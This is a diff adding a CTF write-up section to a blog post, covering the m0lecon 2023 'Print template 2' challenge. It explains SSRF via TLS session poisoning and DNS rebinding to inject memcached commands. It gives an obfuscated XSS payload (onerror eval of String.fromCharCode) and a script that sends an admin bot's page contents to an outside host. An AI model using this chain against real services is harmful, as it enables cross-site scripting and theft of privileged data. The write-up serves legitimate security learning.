@@ -56,6 +56,7 @@
 
 <ul>
   <li><a href="#goldinospizza2">goldinospizza2</a> - Web, websocket API, exploit race condition</li>
+  <li><a href="#print-template-2">Print template 2</a></li>
 </ul>
 
 <h2 id="goldinospizza2">goldinospizza2</h2>
@@ -132,6 +133,75 @@
 <p>With enough balance, order the golden “The flagship of pizzas”, get the flag and submitted at 4:00 AM BST. Enjoy the 🍕:</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ptm{https://youtu.be/Uzryuem5NDc lets make pizza greater than zero again https://www.giallozafferano.com/recipes/Pizza-Margherita.html}
+</code></pre></div></div>
+
+<h2 id="print-template-2">Print template 2</h2>
+
+<p>A challenge with a web app under the misc category. IIRC the challenge was released after a while since the CTF started. It was a hard challenge, with team “organizers” first blooded it at 6:06 AM BST, and team “Kalmarunionen” submitted the flag half an hour before the CTF ends. I was not able to solve it myself. This writeup follows <a href="https://sam.ninja/">Sam.ninja</a> and <a href="https://twitter.com/pilvar222">pilvar</a>’s solution and payloads, which appears to be the <a href="https://discord.com/channels/1100159162794655904/1100159163096633453/1106990892780359771" title="Just link to a Discord message that one of the challenge author Xato confirms it is the intended solution">intended solution</a>.</p>
+
+<p>The webapp lets user import templates and “print” them by substitute the place holders in the template with data, and download the print.</p>
+
+<p><img src="/assets/image/m0lecon-teaser-2023-writeup/import-template.png" alt="Import template" /></p>
+
+<p>The user can also submit a “premium request” for review, which will be reviewed by the admin bot. Part of the template which renders the bot will visit is as follows:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">data:image/png;base64,&lt;%=</span> <span class="na">request.img</span> <span class="err">%</span><span class="nt">&gt;</span>&gt;
+<span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"my-3"</span><span class="nt">&gt;&lt;</span><span class="err">%=</span> <span class="na">request.msg</span> <span class="err">%</span><span class="nt">&gt;&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>As with <code class="highlighter-rouge">&lt;%=</code> tag in EJS, the output will be HTML escaped, so it is not possible to inject script with <code class="highlighter-rouge">msg</code>, however it is possible to inject script in the <code class="highlighter-rouge">img</code> tag with <code class="highlighter-rouge">onerror</code> attribute.</p>
+
+<p>On the web server, the file uploaded will be encoded in base64 and stored in memcached as the <code class="highlighter-rouge">img</code> value being used when rendering the template. With it rendered into base64, it is not possible to inject script into the <code class="highlighter-rouge">img</code> tag. However, if it is possible to control the content stored into memcached, it is possible to inject script into the <code class="highlighter-rouge">img</code> tag.</p>
+
+<h3 id="ssrf-via-tls-poisoning">SSRF via TLS Poisoning</h3>
+
+<p>We cannot make request from our machine directly, we will need to leverage SSRF to make request to memcached.</p>
+
+<p>The “import template” function allows us to import template from a URL. The URL can be a http or https URL, and the server will make the request. The SSRF is exploited via TLS session resumption by injecting payload into session ID. As memcached commands are newline terminated and invalid input will be skipped, it is possible to inject command with new lines. <a href="https://github.com/jmdx/TLS-poison">This TLS Poison PoC</a> is used to implement the exploit. More details about the exploit can be found in <a href="https://youtube.com/watch?v=qGpAJxfADjo">the presentation at DEF CON Safe Mode</a>.</p>
+
+<p>With some modification to the PoC, a customised TLS server and DNS server for DNS rebinding is set up. Make HTTPS request to the TLS server, the TLS server will response a redirect with the TLS session ID being the payload. The client will be repeatedly redirected to the TLS server until the client makes another request to the DNS server, which will resolve to the target IP. As the TLS session ID is keyed by the hostname and port but not IP address, the session ID is reused for the request to the target IP. The request will be made to the target IP with the payload in the session ID.</p>
+
+<p>It is shown in the image below that the payload is in the request made by the curl client to the localhost target.</p>
+
+<p><img src="/assets/image/m0lecon-teaser-2023-writeup/tls-poisoning.png" alt="TLS Poisoning" /></p>
+
+<h3 id="send-payload-into-memcached">Send Payload into Memcached</h3>
+
+<p>When request the bot to review, the bot will visit every unvisited requests by the user where an UUID is generated and saved when the request is submitted. The UUID is also used as the key to store the request in memcached. However, the UUID is not revealed to the user. The UUID is generated with <code class="highlighter-rouge">Math.random</code>. The user IDs are also UUIDs generated with the same library, with knowing enough sequentially generated user IDs, it is possible to predict the future UUIDs.</p>
+
+<p>In this writeup, I skipped the steps bruteforcing for the UUIDs, and just use the UUIDs that is printed to console when the request is submitted and the server generates it.</p>
+
+<p>The script the bot executes is as follows:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span><span class="o">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span><span class="o">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;/h3&gt;</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">trim</span><span class="p">())</span>
+    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span><span class="o">=&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://x.cjxol.com/</span><span class="dl">"</span><span class="o">+</span><span class="nx">x</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>The final payload for TLS session ID becomes the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set message_cd330b28-93e9-4524-a70b-d1a03fac941c 0 0 434
+{"msg":"whatever","img":"a id=deny onerror=eval(String.fromCharCode(102,101,116,99,104,40,34,47,34,41,46,116,104,101,110,40,120,61,62,120,46,116,101,120,116,40,41,41,46,116,104,101,110,40,120,61,62,120,46,115,112,108,105,116,40,34,60,47,104,51,62,34,41,91,49,93,46,116,114,105,109,40,41,41,46,116,104,101,110,40,120,61,62,102,101,116,99,104,40,34,104,116,116,112,58,47,47,120,46,99,106,120,111,108,46,99,111,109,47,34,43,120,41,41))"}
+set message_cd330b28-93e9-4524-a70b-d1a03fac941c 0 0 434
+{"msg":"whatever","img":"a id=deny onerror=eval(String.fromCharCode(102,101,116,99,104,40,34,47,34,41,46,116,104,101,110,40,120,61,62,120,46,116,101,120,116,40,41,41,46,116,104,101,110,40,120,61,62,120,46,115,112,108,105,116,40,34,60,47,104,51,62,34,41,91,49,93,46,116,114,105,109,40,41,41,46,116,104,101,110,40,120,61,62,102,101,116,99,104,40,34,104,116,116,112,58,47,47,120,46,99,106,120,111,108,46,99,111,109,47,34,43,120,41,41))"}
+</code></pre></div></div>
+
+<p>The payload is repeated twice as the injection sometimes does not work as expected. The image tag sets ID to <code class="highlighter-rouge">deny</code> as the bot will click on the deny button which can cause a navigation before the script is executed. With image ID set as <code class="highlighter-rouge">deny</code>, the bot will not click on the deny button and click the image instead which does not cause a navigation.</p>
+
+<p>In the <code class="highlighter-rouge">get-template</code> page, import template from the URL pointing to the TLS server. After a while, the web server will make request to Memcached and the payload will be stored in Memcached.</p>
+
+<p>When querying Memcached directly, we can see the payload is stored in Memcached.</p>
+
+<p><img src="/assets/image/m0lecon-teaser-2023-writeup/memcached.png" alt="Payload is in Memcached" /></p>
+
+<p>When requested to review the requests, the bot will visit the page and execute the script. The flag is exfiltrated.</p>
+
+<p><img src="/assets/image/m0lecon-teaser-2023-writeup/flag.png" alt="Flag is exfiltrated" /></p>
+
+<p>The image is showing the fake flag for testing, and the real flag is:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ptm{why_an0ther_ch4ll_w1th_4_b0t??}
 </code></pre></div></div>
 
   </div><a class="u-url" href="/posts/m0lecon-teaser-2023-writeup/" hidden></a>
